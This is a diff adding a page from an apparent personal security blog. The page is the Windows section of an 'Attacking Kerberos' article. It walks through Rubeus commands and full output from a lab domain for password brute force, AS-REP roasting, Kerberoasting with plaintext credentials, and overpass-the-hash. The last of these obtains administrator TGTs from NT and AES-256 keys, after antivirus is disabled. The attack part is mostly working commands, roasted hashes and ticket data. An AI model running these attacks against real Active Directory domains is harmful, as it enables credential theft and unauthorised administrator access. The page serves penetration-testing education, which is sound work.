@@ -1,0 +1,477 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Abuse</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/monokai.css">
+    <link rel="stylesheet" href="/articles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul><br/>
+        </nav>
+    </header>
+    <section class="hero">
+        <div class="hero-content">
+            <img src="/img/articles/logo14.png" alt="index-logo" class="index-logo">
+            <h1>Attacking Kerberos</h1>
+            <p>from Windows</p>
+            <a href="/articles.html" class="mainbtn" class="mainbtn">More articles</a>
+        </div>
+    </section>
+    <section class="article-content">
+        <div class="container">
+            <div class="article-content-main">
+                <h2>Windows Abuse</h2><br/>
+<p>In this section, we'll perform the same attacks we demonstrated earlier in this article, but on Windows. Of course, these attacks require you to have shell access to a Windows machine that is part of the domain.</p><br/>
+<h2>Tools</h2><br/>
+<ul>
+<li><a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe">Rubeus</a> (compiled version from the SharpCollections repository)</li>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> </li>
+</ul><br/>
+<h3 class="note">Note</h3><br/>
+<p>These tools are often detected by antivirus software, so you must be cautious in real-world scenarios. However, for the purpose of this article, I disabled the antivirus to simplify the process.</p><br/>
+<h2>Kerberos Brute Force</h2><br/>
+<p>This technique is not effective for user enumeration because you can retrieve domain user accounts directly using PowerShell:</p><br/>
+<div class="highlight"><pre><span></span><span class="c"># Using net command (builtin command) </span>
+<span class="n">net</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>
+
+<span class="c"># Using ActiveDirectory module</span>
+<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">SamAccountName</span>
+</pre></div>
+<p>However, password brute-forcing against a list of usernames can still be useful. You can supply both a username list and a password list to perform the brute force attack:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1"># Providing a users list</span>
+<span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">brute</span> <span class="o">/</span><span class="n">passwords</span><span class="p">:</span><span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="o">/</span><span class="n">users</span><span class="p">:</span><span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">valid_creds</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="c1"># For all users in the current domain</span>
+<span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">brute</span> <span class="o">/</span><span class="n">passwords</span><span class="p">:</span><span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">valid_creds</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+<h2>AS-REP Roasting</h2><br/>
+<p>You can exploit an AS-REP Roasting attack using <code>Rubeus</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="o">/</span><span class="nb">format</span><span class="p">:</span><span class="n">john</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">asrep_roast</span><span class="o">.</span><span class="n">txt</span>
+
+   <span class="n">______</span>        <span class="n">_</span>
+  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
+  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>
+
+  <span class="n">v2</span><span class="mf">.3.2</span>
+
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">roasting</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">Domain</span>          <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="n">path</span> <span class="s1">'LDAP://dc01.elswixcorp.local/DC=elswixcorp,DC=local'</span> <span class="k">for</span> <span class="s1">'(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SamAccountName</span>         <span class="p">:</span> <span class="n">peter</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DistinguishedName</span>      <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">peter</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="p">(</span><span class="n">fe80</span><span class="p">::</span><span class="mi">2810</span><span class="p">:</span><span class="n">e2e3</span><span class="p">:</span><span class="mi">6669</span><span class="p">:</span><span class="mi">29</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span><span class="n">o</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local\peter'</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="n">w</span><span class="o">/</span><span class="n">o</span> <span class="n">preauth</span> <span class="n">successful</span><span class="err">!</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Hash</span> <span class="n">written</span> <span class="n">to</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">asrep_roast</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Roasted</span> <span class="n">hashes</span> <span class="n">written</span> <span class="n">to</span> <span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">asrep_roast</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+<p>This command performs an AS-REP Roasting attack against users in the current domain and saves the retrieved hashes to the <code>asrep_roast.txt</code> file:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="n">cat</span> <span class="n">asrep_roast</span><span class="o">.</span><span class="n">txt</span>
+<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="n">peter</span><span class="nd">@elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">:</span><span class="mi">47</span><span class="n">BCC0EBF603F4499F31B296940F5E84</span><span class="err">$</span><span class="n">DC5256536C429D44BE4A8666D639E825809047A251FDF302980F31B347B4B42B9254676578F486E498989CE2B83BCA2A26ECB2310B7E7AEC4B6CAA590D6FF75FB930321606129849D64407D8C46449412F0DA06288171897A876EF4594A738F50DAB7D6BCD56452880F2A282BB56242C34F14387BA7C681418B394BD4B8325725E68E19A813CD6903062D96F4FB86D3D5CA4B2044514EC8DCA87AFFC57F765A73B66633FD8F46B0F0FA4DD2785C999B3C4E30005E3760F9705977C632A9C5207F6A9976A9DA463069A4BC4E43E280D6381367D5D9756C631F470F52E42F260C5B55CC4FE6DBAE0CFCD2A8F250623CE4B2D63D8F7</span>
+<span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span>
+</pre></div>
+<p>You can crack this hash using <code>john</code>.</p><br/>
+<h2>Kerberoasting</h2><br/>
+<p>To perform a Kerberoasting attack with <code>Rubeus</code>, you need to provide credentials:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">creduser</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">peter</span> <span class="o">/</span><span class="n">credpassword</span><span class="p">:</span><span class="n">cr4ckthis4n</span><span class="err">!</span><span class="n">c</span><span class="o">%</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="nb">hash</span><span class="o">.</span><span class="n">txt</span>
+
+   <span class="n">______</span>        <span class="n">_</span>
+  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
+  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>
+
+  <span class="n">v2</span><span class="mf">.3.2</span>
+
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Kerberoasting</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">NOTICE</span><span class="p">:</span> <span class="n">AES</span> <span class="n">hashes</span> <span class="n">will</span> <span class="n">be</span> <span class="n">returned</span> <span class="k">for</span> <span class="n">AES</span><span class="o">-</span><span class="n">enabled</span> <span class="n">accounts</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span>         <span class="n">Use</span> <span class="o">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">X</span> <span class="ow">or</span> <span class="o">/</span><span class="n">tgtdeleg</span> <span class="n">to</span> <span class="n">force</span> <span class="n">RC4_HMAC</span> <span class="k">for</span> <span class="n">these</span> <span class="n">accounts</span><span class="o">.</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">Domain</span>          <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="n">path</span> <span class="s1">'LDAP://dc01.elswixcorp.local/DC=elswixcorp,DC=local'</span> <span class="k">for</span> <span class="s1">'(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Total</span> <span class="n">kerberoastable</span> <span class="n">users</span> <span class="p">:</span> <span class="mi">1</span>
+
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SamAccountName</span>         <span class="p">:</span> <span class="n">ellie</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DistinguishedName</span>      <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">ellie</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ServicePrincipalName</span>   <span class="p">:</span> <span class="n">http</span><span class="o">/</span><span class="n">ellie</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">PwdLastSet</span>             <span class="p">:</span> <span class="mi">12</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">7</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">52</span> <span class="n">PM</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Supported</span> <span class="n">ETypes</span>       <span class="p">:</span> <span class="n">RC4_HMAC_DEFAULT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Hash</span> <span class="n">written</span> <span class="n">to</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="nb">hash</span><span class="o">.</span><span class="n">txt</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Roasted</span> <span class="n">hashes</span> <span class="n">written</span> <span class="n">to</span> <span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="nb">hash</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+<p>As shown, the tool identified one vulnerable user and saved the roasted hash to <code>hash.txt</code> as specified using the <code>/outfile</code> parameter.</p><br/>
+<h2>Overpass The Hash/Pass The Key</h2><br/>
+<p><code>Rubeus</code> also allows you to authenticate using a hash or key. For example, you can request a TGT from the KDC by providing the NT hash:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span> <span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">administrator</span><span class="o">.</span><span class="n">kirbi</span>
+
+   <span class="n">______</span>        <span class="n">_</span>
+  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
+  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>
+
+  <span class="n">v2</span><span class="mf">.3.2</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">rc4_hmac</span> <span class="nb">hash</span><span class="p">:</span> <span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local</span><span class="se">\a</span><span class="s1">dministrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">2810</span><span class="p">:</span><span class="n">e2e3</span><span class="p">:</span><span class="mi">6669</span><span class="p">:</span><span class="mi">29</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="p">:</span><span class="mi">88</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>
+
+      <span class="n">doIF7DCCBeigAwIBBaEDAgEWooIE8DCCBOxhggToMIIE5KADAgEFoRIbEEVMU1dJWENPUlAuTE9DQUyi</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+      <span class="n">OFqnERgPMjAyNTAxMDIwNDE5MjhaqBIbEEVMU1dJWENPUlAuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0</span>
+      <span class="n">Z3QbEGVsc3dpeGNvcnAubG9jYWw</span><span class="o">=</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Ticket</span> <span class="n">written</span> <span class="n">to</span> <span class="n">administrator</span><span class="o">.</span><span class="n">kirbi</span>
+
+
+  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
+  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">administrator</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
+  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
+  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">12</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">8</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span> <span class="n">PM</span>
+  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">12</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">6</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span> <span class="n">AM</span>
+  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">8</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span> <span class="n">PM</span>
+  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
+  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">rc4_hmac</span>
+  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">3</span><span class="n">Zk</span><span class="o">+</span><span class="n">IPnVyZ0kW85esGiKDw</span><span class="o">==</span>
+  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span>
+</pre></div>
+<p>Here, we successfully obtained a TGT for the administrator account using the <code>/rc4</code> parameter to provide the NT hash. You can also use an AES-256 key:</p><br/>
+<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="evrm">C</span><span class="evrm">:</span><span class="evrm">\</span><span class="evrm">temp</span><span class="evrm">&gt;</span> <span class="o">.</span>\<span class="n">rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span> <span class="o">/</span><span class="n">aes256</span><span class="p">:</span><span class="mi">30</span><span class="n">ed0b2f17e5fc76b29402e3da4bd05337abfcdc2a6412d08d6d4e68db070506</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">administrator</span><span class="o">.</span><span class="n">kirbi</span>
+
+   <span class="n">______</span>        <span class="n">_</span>
+  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
+  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>
+
+  <span class="n">v2</span><span class="mf">.3.2</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">aes256_cts_hmac_sha1</span> <span class="nb">hash</span><span class="p">:</span> <span class="mi">30</span><span class="n">ed0b2f17e5fc76b29402e3da4bd05337abfcdc2a6412d08d6d4e68db070506</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local</span><span class="se">\a</span><span class="s1">dministrator'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">2810</span><span class="p">:</span><span class="n">e2e3</span><span class="p">:</span><span class="mi">6669</span><span class="p">:</span><span class="mi">29</span><span class="n">d0</span><span class="o">%</span><span class="mi">8</span><span class="p">:</span><span class="mi">88</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>
+
+      <span class="n">doIGDDCCBgigAwIBBaEDAgEWooIFADCCBPxhggT4MIIE9KADAgEFoRIbEEVMU1dJWENPUlAuTE9DQUyi</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+      <span class="n">V0lYQ09SUC5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQZWxzd2l4Y29ycC5sb2NhbA</span><span class="o">==</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Ticket</span> <span class="n">written</span> <span class="n">to</span> <span class="n">administrator</span><span class="o">.</span><span class="n">kirbi</span>
+
+
+  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
+  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
+  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">administrator</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
+  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
+  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">12</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">8</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">13</span> <span class="n">PM</span>
+  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">12</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">6</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">13</span> <span class="n">AM</span>
+  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">8</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">13</span> <span class="n">PM</span>
+  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
+  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">aes256_cts_hmac_sha1</span>
+  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="n">oFBG2IELW1tOcfTyd7NmpgpQk3rDAdJf5c4GnwIC4VE</span><span class="o">=</span>
+  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">30</span><span class="n">ED0B2F17E5FC76B29402E3DA4BD05337ABFCDC2A6412D08D6D4E68DB070506</span>
+</pre></div>
